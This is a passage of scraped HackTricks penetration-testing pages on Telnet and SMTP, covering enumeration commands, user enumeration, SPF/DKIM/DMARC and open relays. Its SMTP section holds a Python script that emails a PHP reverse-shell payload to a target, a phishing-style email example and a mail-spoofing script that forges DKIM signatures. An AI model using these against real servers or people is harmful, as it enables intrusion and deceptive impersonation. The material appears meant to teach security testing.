PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nFTP Bounce - Download 2¬∫FTP file\nNext\n- Network Services Pentesting\n23 - Pentesting Telnet\nLast modified\n2mo ago"
    },
    {
        "title": "23 - Pentesting Telnet",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet",
        "text": "23 - Pentesting Telnet\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nBasic Information\nTelnet is a network protocol that gives users a UNsecure way to access a computer over a network.\nDefault port:\n23\n23/tcp open  telnet\nEnumeration\nBanner Grabbing\nnc\n-vn\n<\nIP\n>\n23\nAll the interesting enumeration can be performed by\nnmap\n:\nnmap\n-n\n-sV\n-Pn\n--script\n\"*telnet* and safe\"\n-p\n23\n<\nIP\n>\nThe script\ntelnet-ntlm-info.nse\nwill obtain NTLM info (Windows versions).\nIn the TELNET Protocol are various \"\noptions\n\" that will be sanctioned and may be used with the \"\nDO, DON'T, WILL, WON'T\n\" structure to allow a user and server to agree to use a more elaborate (or perhaps just different) set of conventions for their TELNET connection. Such options could include changing the character set, the echo mode, etc. (From the\ntelnet RFC\n)\nI know it is possible to enumerate this options but I don't know how, so let me know if know how.\n‚Äã\nBrute force\n‚Äã\nConfig file\n/etc/inetd.conf\n/etc/xinetd.d/telnet\n/etc/xinetd.d/stelnet\nHackTricks Automatic Commands\nProtocol_Name: Telnet    #Protocol Abbreviation if there is one.\nPort_Number:  23     #Comma separated if there is more than one.\nProtocol_Description: Telnet          #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for t=Telnet\nNote: |\nwireshark to hear creds being passed\ntcp.port == 23 and ip.addr != myip\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-telnet\n‚Äã\nEntry_2:\nName: Banner Grab\nDescription: Grab Telnet Banner\nCommand: nc -vn {IP} 23\n‚Äã\nEntry_3:\nName: Nmap with scripts\nDescription: Run nmap scripts for telnet\nCommand: nmap -n -sV -Pn --script \"*telnet*\" -p 23 {IP}\nEntry_4:\nName: consoleless mfs enumeration\nDescription: Telnet enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit'\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n22 - Pentesting SSH/SFTP\nNext\n- Network Services Pentesting\n25,465,587 - Pentesting SMTP/s\nLast modified\n6mo ago"
    },
    {
        "title": "25,465,587 - Pentesting SMTP/s",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp",
        "text": "25,465,587 - Pentesting SMTP/s\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nBasic Information\nSMTP (Simple Mail Transfer Protocol)\nis a TCP/IP protocol used in\nsending\nand receiving\ne-mail\n. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.\nIn other words,\nusers typically use\na program that uses\nSMTP for sending e-mail\nand either\nPOP3 or IMAP for receiving\ne-mail. On Unix-based systems,\nsendmail\nis the most widely-used SMTP server for e-mail. A commercial package, Sendmail, includes a POP3 server.\nMicrosoft Exchange\nincludes an SMTP server and can also be set up to include POP3 support.\nFrom\nhere\n.\nDefault port:\n25,465(ssl),587(ssl)\nPORT   STATE SERVICE REASON  VERSION\n25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959\nEMAIL Headers\nIf you have the opportunity to\nmake the victim send you a emai\nl (via contact form of the web page for example), do it because\nyou could learn about the internal topology\nof the victim seeing the headers of the mail.\nYou can also get an email from a SMTP server trying to\nsend to that server an email to a non-existent address\n(because the server will send to the attacker a NDN mail). But, be sure that you send the email from an allowed address (check the SPF policy) and that you can receive NDN messages.\nYou should also try to\nsend different contents because you can find more interesting information\non the headers like:\nX-Virus-Scanned: by av.domain.com\nYou should send the EICAR test file.\nDetecting the\nAV\nmay allow you to exploit\nknown vulnerabilities.\nBasic actions\nBanner Grabbing/Basic connection\nSMTP:\nnc\n-vn\n<\nIP\n>\n25\nSMTPS\n:\nopenssl s_client\n-crlf\n-connect\nsmtp.mailgun.org:465\n#SSL/TLS without starttls command\nopenssl s_client\n-starttls\nsmtp\n-crlf\n-connect\nsmtp.mailgun.org:587\nFinding MX servers of an organisation\ndig\n+short mx google.com\nEnumeration\nnmap\n-p25\n--script\nsmtp-commands\n10.10\n.10.10\nnmap\n-p25\n--script\nsmtp-open-relay\n10.10\n.10.10\n-v\nNTLM Auth - Information disclosure\nIf the server supports NTLM auth (Windows) you can obtain sensitive info (versions). More info\nhere\n.\nroot@kali: telnet example.com\n587\n220\nexample.com SMTP Server Banner\n>>\nHELO\n250\nexample.com Hello\n[\nx.x.x.x\n]\n>>\nAUTH NTLM\n334\nNTLM supported\n>>\nTlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA\n=\n334\nTlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA\nOr\nautomate\nthis with\nnmap\nplugin\nsmtp-ntlm-info.nse\nInternal server name - Information disclosure\nSome SMTP servers auto-complete a sender's address when command \"MAIL FROM\" is issued without a full address, disclosing its internal name:\n220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200\nEHLO all\n250-somedomain.com Hello [x.x.x.x]\n250-TURN\n250-SIZE 52428800\n250-ETRN\n250-PIPELINING\n250-DSN\n250-ENHANCEDSTATUSCODES\n250-8bitmime\n250-BINARYMIME\n250-CHUNKING\n250-VRFY\n250 OK\nMAIL FROM: me\n250 2.1.0\n[email¬†protected]\nOK\nSniffing\nCheck if you sniff some password from the packets to port 25\n‚Äã\nAuth bruteforce\n‚Äã\nUsername Bruteforce Enumeration\nAuthentication is not always needed\nRCPT TO\n$ telnet\n10.0\n.10.1\n25\nTrying\n10.0\n.10.1\n..\n.\nConnected to\n10.0\n.10.1.\nEscape character is\n'^]'\n.\n220\nmyhost ESMTP Sendmail\n8.9\n.3\nHELO x\n250\nmyhost Hello\n[\n10.0\n.0.99\n]\n, pleased to meet you\nMAIL FROM:\n[email¬†protected]\n250\n2.1\n.0\n[email¬†protected]\n..\n. Sender ok\nRCPT TO:test\n550\n5.1\n.1 test\n..\n. User unknown\nRCPT TO:admin\n550\n5.1\n.1 admin\n..\n. User unknown\nRCPT TO:ed\n250\n2.1\n.5 ed\n..\n. Recipient ok\nVRFY\n$ telnet 10.0.0.1 25\nTrying 10.0.0.1...\nConnected to 10.0.0.1.\nEscape character is '^]'.\n220 myhost ESMTP Sendmail 8.9.3\nHELO\n501 HELO requires domain address\nHELO x\n250 myhost Hello [10.0.0.99], pleased to meet you\nVRFY root\n250 Super-User <root@myhost>\nVRFY blah\n550 blah... User unknown\nEXPN\n$ telnet 10.0.10.1 25\nTrying 10.0.10.1...\nConnected to 10.0.10.1.\nEscape character is '^]'.\n220 myhost ESMTP Sendmail 8.9.3\nHELO\n501 HELO requires domain address\nHELO x\nEXPN test\n550 5.1.1 test... User unknown\nEXPN root\n250 2.1.5 <ed.williams@myhost>\nEXPN sshd\n250 2.1.5 sshd privsep <sshd@mail2>\nExtracted from:\nhttps://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/\n‚Äã\nAutomatic tools\nMetasploit: auxiliary/scanner/smtp/smtp_enum\nsmtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>\nNmap: nmap --script smtp-enum-users <IP>\n‚Äã\n‚Äã\nDragonJAR Security Conference es un evento internacional de ciberseguridad\ncon m√°s de una d√©cada que se celebrar√° el 7 y 8 de septiembre de 2023 en Bogot√°, Colombia. Es un evento de gran contenido t√©cnico donde se presentan las √∫ltimas investigaciones en espa√±ol que atrae a hackers e investigadores de todo el mundo.\n¬°Reg√≠strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:\nCongreso De Hackers - DragonJAR Security Conference - Congreso de Hackers\nCongreso de Hackers\nDSN Reports\nDelivery Status Notification Reports\n: If you send an\nemail\nto an organisation to an\ninvalid address\n, the organisation will notify that the address was invalided sending a\nmail back to you\n.\nHeaders\nof the returned email will\ncontain\npossible\nsensitive information\n(like IP address of the mail services that interacted with the reports or anti-virus software info).\n‚Äã\nCommands\n‚Äã\nSending an Email from linux console\nroot@kali:~# sendEmail -t\n[email¬†protected]\n-f\n[email¬†protected]\n-s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf\nReading message body from STDIN because the '-m' option was not used.\nIf you are manually typing in a message:\n- First line must be received within 60 seconds.\n- End manual input with a CTRL-D on its own line.\n‚Äã\nIT Dept,\n‚Äã\nWe are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.\n‚Äã\nSincerely,\nswaks\n--to\n$(\ncat\nemails\n|\ntr\n'\\n'\n','\n|\nless\n)\n--from\n[email¬†protected]\n--header\n\"Subject: test\"\n--body\n\"please click here http://10.10.14.42/\"\n--server\n10.10\n.10.197\nSending an Email with Python\nHere's alternative way to send an email with python script\nfrom\nemail\n.\nmime\n.\nmultipart\nimport\nMIMEMultipart\nfrom\nemail\n.\nmime\n.\ntext\nimport\nMIMEText\nimport\nsmtplib\nimport\nsys\n‚Äã\nlhost\n=\n\"127.0.0.1\"\nlport\n=\n443\nrhost\n=\n\"192.168.1.1\"\nrport\n=\n25\n# 489,587\n‚Äã\n# create message object instance\nmsg\n=\nMIMEMultipart\n()\n‚Äã\n# setup the parameters of the message\npassword\n=\n\"\"\nmsg\n[\n'From'\n]\n=\n\"attacker@local\"\nmsg\n[\n'To'\n]\n=\n\"victim@local\"\nmsg\n[\n'Subject'\n]\n=\n\"This is not a drill!\"\n‚Äã\n# payload\nmessage\n=\n(\n\"<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>\"\n%\n(\nlhost\n,\nlport\n))\n‚Äã\nprint\n(\n\"[*] Payload is generated : %s\"\n%\nmessage\n)\n‚Äã\nmsg\n.\nattach\n(\nMIMEText\n(\nmessage\n,\n'plain'\n))\nserver\n=\nsmtplib\n.\nSMTP\n(\nhost\n=\nrhost\n,\nport\n=\nrport\n)\n‚Äã\nif\nserver\n.\nnoop\n()[\n0\n]\n!=\n250\n:\nprint\n(\n\"[-]Connection Error\"\n)\nexit\n()\n‚Äã\nserver\n.\nstarttls\n()\n‚Äã\n# Uncomment if log-in with authencation\n# server.login(msg['From'], password)\n‚Äã\nserver\n.\nsendmail\n(\nmsg\n[\n'From'\n],\nmsg\n[\n'To'\n],\nmsg\n.\nas_string\n())\nserver\n.\nquit\n()\n‚Äã\nprint\n(\n\"[***]successfully sent email to %s:\"\n%\n(\nmsg\n[\n'To'\n]))\nMail Spoofing\nMost of this section was extracted from the book\nNetwork Security Assessment 3rd Edition\n.\nSMTP messages are easily spoofed, and so organizations use\nSPF\n,\nDKIM\n, and\nDMARC\nfeatures to prevent parties from sending unauthorised email.\nA\ncomplete guide of these countermeasures\ncan be found in\nhttps://seanthegeek.net/459/demystifying-dmarc/\n‚Äã\nSPF\nSPF\nwas \"deprecated\" in 2014\n. This means that instead of creating a\nTXT record\nin\n_spf.domain.com\nyou create it in\ndomain.com\nusing the\nsame syntax\n.\nMoreover, to reuse previous spf records it's quiet common to find something like\n\"v=spf1 include:_spf.google.com ~all\"\nSender Policy Framework\n(SPF) provides a mechanism that allows MTAs to check if a host sending an email is authorized.\nThen, the organisations can define a list of authorised mail servers and the MTAs can query for this lists to check if the email was spoofed or not.\nIn order to define IP addresses/ranges, domains and others that are\nallowed to send email on behalf a domain name\n, different \"\nMechanism\n\" cam appear in the SPF registry.\nMechanisms\nMechanism\nDescription\nALL\nMatches always; used for a default result like\n-all\nfor all IPs not matched by prior mechanisms.\nA\nIf the domain name has an address record (A or AAAA) that can be resolved to the sender's address, it will match.\nIP4\nIf the sender is in a given IPv4 address range, match.\nIP6\nIf the sender is in a given IPv6 address range, match.\nMX\nIf the domain name has an MX record resolving to the sender's address, it will match (i.e. the mail comes from one of the domain's incoming mail servers).\nPTR\nIf the domain name (PTR record) for the client's address is in the given domain and that domain name resolves to the client's address (forward-confirmed reverse DNS), match. This mechanism is discouraged and should be avoided, if possible.\nEXISTS\nIf the given domain name resolves to any address, match (no matter the address it resolves to). This is rarely used. Along with the SPF macro language it offers more complex matches like DNSBL-queries.\nINCLUDE\nReferences the policy of another domain. If that domain's policy passes, this mechanism passes. However, if the included policy fails, processing continues. To fully delegate to another domain's policy, the redirect extension must be used.\nREDIRECT\nA redirect is a pointer to another domain name that hosts an SPF policy, it allows for multiple domains to share the same SPF policy. It is useful when working with a large amount of domains that share the same email infrastructure.\nIt SPF policy of the domain indicated in the redirect Mechanism will be used.\nIt's also possible to identify\nQualifiers\nthat indicates\nwhat should be done if a mechanism is matched\n. By default, the\nqualifier \"+\"\nis used (so if any mechanism is matched, that means it's allowed).\nYou usually will note\nat the end of each SPF policy\nsomething like:\n~all\nor\n-all\n. This is used to indicate that\nif the sender doesn't match any SPF policy, you should tag the email as untrusted (~) or reject (-) the email.\nQualifiers\nEach mechanism can be combined with one of four qualifiers:\n+\nfor a PASS result. This can be omitted; e.g.,\n+mx\nis the same as\nmx\n.\n?\nfor a NEUTRAL result interpreted like NONE (no policy).\n~\n(tilde) for SOFTFAIL, a debugging aid between NEUTRAL and FAIL. Typically, messages that return a SOFTFAIL are accepted but tagged.\n-\n(minus) for FAIL, the mail should be rejected (see below).\nIn the following example you can read the\nSPF policy of google.com\n. Note how the\nfirst SPF policy includes SPF policies of other domains:\nkali@kali\n:\n~\n$\ndig\ntxt google.com\n|\ngrep\nspf\ngoogle.com.             235     IN      TXT     \"v=spf1 include:_spf.google.com ~all\"\n‚Äã\nkali@kali\n:\n~\n$\ndig\ntxt _spf.google.com\n|\ngrep\nspf\n; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com\n;_spf.google.com.               IN      TXT\n_spf.google.com.        235     IN      TXT     \"v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all\"\n‚Äã\nkali@kali\n:\n~\n$\ndig\ntxt _netblocks.google.com\n|\ngrep\nspf\n_netblocks.google.com.  1606    IN      TXT     \"v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all\"\n‚Äã\nkali@kali\n:\n~\n$\ndig\ntxt _netblocks2.google.com\n|\ngrep\nspf\n_netblocks2.google.com. 1908    IN      TXT     \"v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\"\n‚Äã\nkali@kali\n:\n~\n$\ndig\ntxt _netblocks3.google.com\n|\ngrep\nspf\n_netblocks3.google.com. 1903    IN      TXT     \"v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all\"\nTraditionally it was possible to spoof any domain name that didn't have a correct/any SPF record.\nNowadays\n, if\nemail\ncomes from a\ndomain without a valid SPF record\nis probably going to be\nrejected/marked as untrusted automatically\n.\nTo check the SPF of a domain you can use online tools like:\nhttps://www.kitterman.com/spf/validate.html\n‚Äã\nDKIM\nDomainKeys Identified Mail (DKIM) is a mechanism by which\noutbound email is signed and validated by foreign MTAs upon retrieving a domain‚Äôs public key via DNS\n. The DKIM public key is held within a TXT record for a domain; however, you must know both the selector and domain name to retrieve it.\nThen, to ask for the key you need the domain name and the selector of the mail from the mail header\nDKIM-Signature\nfor example:\nd=gmail.com;s=20120113\ndig\n20120113\n._domainkey.gmail.com TXT\n|\ngrep\np\n=\n20120113\n._domainkey.gmail.com.\n280\nIN   TXT    \"k\n=\nrsa\n\\;\np\n=\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg\nKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3\nDMARC\nDomain-based Message Authentication, Reporting & Conformance (DMARC) is a method of mail authentication that expands upon SPF and DKIM. Policies instruct mail servers how to process email for a given domain and report upon actions performed.\nTo obtain the DMARC record, you need to query the subdomain _dmarc\nroot@kali\n:\n~\n#\ndig\n_dmarc.yahoo.com txt\n|\ngrep\nDMARC\n_dmarc.yahoo.com.  1785 IN TXT \"v=DMARC1\\; p=reject\\; sp=none\\; pct=100\\;\nrua=mailto:dma\n[email¬†protected]\n, mailto:\n[email¬†protected]\n\\;\"\n‚Äã\nroot@kali\n:\n~\n#\ndig\n_dmarc.google.com txt\n|\ngrep\nDMARC\n_dmarc.google.com. 600 IN TXT \"v=DMARC1\\; p=quarantine\\; rua=mailto:\n[email¬†protected]\n\"\n‚Äã\nroot@kali\n:\n~\n#\ndig\n_dmarc.paypal.com txt\n|\ngrep\nDMARC\n_dmarc.paypal.com. 300 IN TXT \"v=DMARC1\\; p=reject\\; rua=mailto:\n[email¬†protected]\n\\;\nruf=mailto:\n[email¬†protected]\n,mailto:\n[email¬†protected]\n\"\nPayPal and Yahoo instruct mail servers to reject messages that contain invalid DKIM signatures or do not originate from their networks. Notifications are then sent to the respective email addresses within each organization. Google is configured in a similar way, although it instructs mail servers to quarantine messages and not outright reject them.\nDMARC tags\nTag Name\nPurpose\nSample\nv\nProtocol version\nv=DMARC1\npct\nPercentage of messages subjected to filtering\npct=20\nruf\nReporting URI for forensic reports\nruf=mailto:\n[email¬†protected]\nrua\nReporting URI of aggregate reports\nrua=mailto:\n[email¬†protected]\np\nPolicy for organizational domain\np=quarantine\nsp\nPolicy for subdomains of the OD\nsp=reject\nadkim\nAlignment mode for DKIM\nadkim=s\naspf\nAlignment mode for SPF\naspf=r\nWhat about Subdomains?\nFrom\nhere\n.\nYou need to have separate SPF records for each subdomain you wish to send mail from.\nThe following was originally posted on openspf.org, which used to be a great resource for this kind of thing.\nThe Demon Question: What about subdomains?\nIf I get mail from pielovers.demon.co.uk, and there's no SPF data for pielovers, should I go back one level and test SPF for demon.co.uk? No. Each subdomain at Demon is a different customer, and each customer might have their own policy. It wouldn't make sense for Demon's policy to apply to all its customers by default; if Demon wants to do that, it can set up SPF records for each subdomain.\nSo the advice to SPF publishers is this: you should add an SPF record for each subdomain or hostname that has an A or MX record.\nSites with wildcard A or MX records should also have a wildcard SPF record, of the form: * IN TXT \"v=spf1 -all\"\nThis makes sense - a subdomain may very well be in a different geographical location and have a very different SPF definition.\nOpen Relay\nTo prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a\nrelay server that the recipient trusts\n. Often, administrators\nhaven't overviewed\nof which\nIP\nranges they have to\nallow\n. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they\nallow all IP addresses\nnot to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers:\nmynetworks = 0.0.0.0/0\nnmap\n-p25\n--script\nsmtp-open-relay\n10.10\n.10.10\n-v\nTools\n‚Äã\nhttps://github.com/serain/mailspoof\nCheck for SPF and DMARC misconfigurations\n‚Äã\nhttps://pypi.org/project/checkdmarc/\nAutomatically get SPF and DMARC configs\nSend Spoof Email\n‚Äã\nhttps://www.mailsploit.com/index\n‚Äã\n‚Äã\nhttp://www.anonymailer.net/\n‚Äã\n‚Äã\nhttps://emkei.cz/\n****\nOr you could use a tool:\n‚Äã\nhttps://github.com/magichk/magicspoofing\n****\n# This will send a test email from\n[email¬†protected]\nto\n[email¬†protected]\npython3 magicspoofmail.py\n-d\nvictim.com\n-t\n-e\n[email¬†protected]\n# But you can also modify more options of the email\npython3 magicspoofmail.py\n-d\nvictim.com\n-t\n-e\n[email¬†protected]\n--subject\nTEST\n--sender\n[email¬†protected]\nIf you get any\nerror using in the dkim python lib\nparsing the key feel free to use this following one.\nNOTE\n: This is just a dirty fix to do quick checks in cases where for some reason the openssl private key\ncannot be parsed by dkim\n.\n-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt\nspr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO\npkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB\nAoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1\nkoxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR\nfgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq\n1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j\nZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc\nGNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf\n422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI\nMs2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do\nzRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP\nK9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==\n-----END RSA PRIVATE KEY-----\nOr you could do it manually:\nPHP\nPython\n# This will send an unsigned message\nmail\n(\n\"\n[email¬†protected]\n\"\n,\n\"Test Subject!\"\n,\n\"hey! This is a test\"\n,\n\"From:\n[email¬†protected]\n\"\n);\n# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py\n‚Äã\nimport\nos\nimport\ndkim\n#pip3 install dkimpy\nimport\nsmtplib\nfrom\nemail\n.\nmime\n.\nmultipart\nimport\nMIMEMultipart\nfrom\nemail\n.\nmime\n.\ntext\nimport\nMIMEText\nfrom\nemail\n.\nmime\n.\nbase\nimport\nMIMEBase\n‚Äã\n# Set params\ndestination\n=\n\"\n[email¬†protected]\n\"\nsender\n=\n\"\n[email¬†protected]\n\"\nsubject\n=\n\"Test\"\nmessage_html\n=\n\"\"\"\n<html>\n<body>\n<h3>This is a test, not a scam</h3>\n<br />\n</body>\n</html>\n\"\"\"\nsender_domain\n=\nsender\n.\nsplit\n(\n\"@\"\n)[\n1\n]\n‚Äã\n# Prepare postfix\nos\n.\nsystem\n(\n\"sudo sed -ri 's/(myhostname) = (.*)/\\\\1 = \"\n+\nsender_domain\n+\n\"/g' /etc/postfix/main.cf\"\n)\nos\n.\nsystem\n(\n\"systemctl restart postfix\"\n)\n‚Äã\n# Generate DKIM keys\ndkim_private_key_path\n=\n\"dkimprivatekey.pem\"\nos\n.\nsystem\n(\nf\"openssl genrsa -out\n{\ndkim_private_key_path\n}\n1024 2> /dev/null\"\n)\nwith\nopen\n(\ndkim_private_key_path\n)\nas\nfh\n:\ndkim_private_key\n=\nfh\n.\nread\n()\n‚Äã\n# Generate email\nmsg\n=\nMIMEMultipart\n(\n\"alternative\"\n)\nmsg\n.\nattach\n(\nMIMEText\n(\nmessage_html\n,\n\"html\"\n))\nmsg\n[\n\"To\"\n]\n=\ndestination\nmsg\n[\n\"From\"\n]\n=\nsender\nmsg\n[\n\"Subject\"\n]\n=\nsubject\nheaders\n=\n[\nb\"To\"\n,\nb\"From\"\n,\nb\"Subject\"\n]\nmsg_data\n=\nmsg\n.\nas_bytes\n()\n‚Äã\n# Sign email with dkim\n## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)\ndkim_selector\n=\n\"s1\"\nsig\n=\ndkim\n.\nsign\n(\nmessage\n=\nmsg_data\n,\nselector\n=\nstr\n(\ndkim_selector\n).\nencode\n(),\ndomain\n=\nsender_domain\n.\nencode\n(),\nprivkey\n=\ndkim_private_key\n.\nencode\n(),\ninclude_headers\n=\nheaders\n)\nmsg\n[\n\"DKIM-Signature\"\n]\n=\nsig\n[\nlen\n(\n\"DKIM-Signature: \"\n)\n:].\ndecode\n()\nmsg_data\n=\nmsg\n.\nas_bytes\n()\n‚Äã\n# Use local postfix relay to send 